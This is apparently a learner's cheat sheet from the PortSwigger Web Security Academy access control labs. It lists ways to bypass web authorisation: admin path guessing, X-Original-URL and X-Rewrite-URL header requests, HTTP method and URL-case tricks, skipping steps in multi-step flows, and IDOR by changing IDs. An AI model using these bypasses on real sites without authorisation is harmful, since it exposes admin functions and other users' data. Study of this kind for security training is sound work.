# Access Control — Cheat Sheet
> PortSwigger Web Security Academy | Access Control Module

---

## Quick Reference — Bypasses to Try

### 1. Hidden Admin Panel
```
/admin
/administrator
/admin-panel
Check JS source for leaked paths (Ctrl+U in browser)
```

---

### 2. Header Bypass (Platform Misconfiguration)
```http
GET / HTTP/1.1
X-Original-URL: /admin/deleteUser

GET / HTTP/1.1
X-Rewrite-URL: /admin/deleteUser
```
> Try both headers. X-Original-URL = Drupal. X-Rewrite-URL = IIS/.NET

---

### 3. HTTP Method Bypass
```
Original (blocked):   POST /admin/deleteUser
Try instead:          GET  /admin/deleteUser
                      PUT  /admin/deleteUser
                      PATCH /admin/deleteUser
                      HEAD /admin/deleteUser
```

---

### 4. URL-Matching Discrepancies
```
Original (blocked):   /admin/deleteUser
Try instead:          /ADMIN/DELETEUSER          ← capitalization
                      /Admin/DeleteUser           ← mixed caps
                      /admin/deleteUser/          ← trailing slash
                      /admin/deleteUser.json      ← file extension (Spring)
                      /admin/deleteUser.anything  ← random extension
```

---

### 5. Multi-Step Process Bypass
```
Normal flow:    Step 1 → Step 2 → Step 3
Attack:         Skip straight to Step 3

Capture step 3 request in Burp → send directly as a low-privilege user
```

---

### 6. IDOR
```
Your profile:         /profile?id=123
Try someone else's:   /profile?id=124
                      /profile?id=1

With GUIDs — look for leaked IDs in:
  - Page source
  - API responses
  - Burp HTTP history
  - Blog posts / comments
```

---

## Burp Suite Workflow

```
1. Intercept request → Send to Repeater (Ctrl+R)
2. Modify the request (change URL, method, add headers)
3. Send and check response
4. Got 200? Vulnerable. Got 403? Try next bypass.
```

---

## What Each Status Code Means

| Code | Meaning |
|---|---|
| 200 | Success — bypass worked |
| 302 | Redirect — might have worked, follow it |
| 403 | Forbidden — blocked, try another bypass |
| 404 | Not found — wrong path |
| 401 | Unauthorized — not logged in |

---

## Labs Completed

| Lab | Bypass Used |
|---|---|
| Unprotected admin functionality with unpredictable URL | JS source leak |
| URL-based access control can be circumvented | X-Original-URL header |
| Multi-step process bypass | Skipped to final step directly |
